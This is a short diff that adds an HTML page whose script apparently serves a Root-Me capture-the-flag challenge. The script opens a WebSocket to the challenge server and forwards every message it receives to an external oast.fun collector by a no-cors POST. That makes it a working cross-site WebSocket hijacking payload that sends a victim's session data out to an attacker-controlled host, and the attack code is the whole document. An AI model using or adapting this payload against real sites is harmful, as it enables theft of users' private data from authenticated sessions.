@@ -1,0 +1,17 @@
+<html><body>
+      <script>
+        var ws = new WebSocket('ws://ctf03.root-me.org/ws');
+
+        ws.onopen = function() {
+            ws.send("READY");
+        };
+
+        ws.onmessage = function(event) {
+            fetch('https://urebhcvlcfzusdpadjhirrwcq5hfanf83.oast.fun', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: event.data
+            });
+        };
+    </script>
+</body></html>
